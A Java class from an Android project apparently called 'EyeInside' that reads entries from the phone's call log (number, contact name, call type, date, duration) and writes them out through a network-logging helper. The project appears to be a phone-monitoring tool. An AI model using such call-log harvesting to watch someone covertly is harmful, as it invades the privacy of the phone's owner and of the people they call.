package com.code4bones.EyeInside;

import java.text.SimpleDateFormat;
import java.util.Date;

import com.code4bones.utils.NetLog;

import android.database.Cursor;
import android.provider.CallLog;

public class CallObj extends Object {

	String phone;
	String name;
	String type;
	String date;
	long  occured;
	long  duration;
	int	   typeVal;
	final public SimpleDateFormat df = new SimpleDateFormat("dd-MM-yyyy' 'HH:mm:ss");
	final public static String[] callTypes = {"callType-0","Входящий","Исходящий","Пропущеный","callType-4","callType-5","callType-6"};

	public CallObj(Cursor cur) {
		
		phone = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));
		typeVal = cur.getInt(cur.getColumnIndex(CallLog.Calls.TYPE));
		type = callTypes[typeVal];
		occured = cur.getLong(cur.getColumnIndex(CallLog.Calls.DATE));
		date = df.format(new Date(occured));
		name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));
		duration = cur.getLong(cur.getColumnIndex(CallLog.Calls.DURATION));
		if ( name == null ) name = "Unknown";
	}
	
	public void Dump() {
		NetLog.v("%s %s %s %s %d\r\n",date,type,phone,name,duration);
	}
}
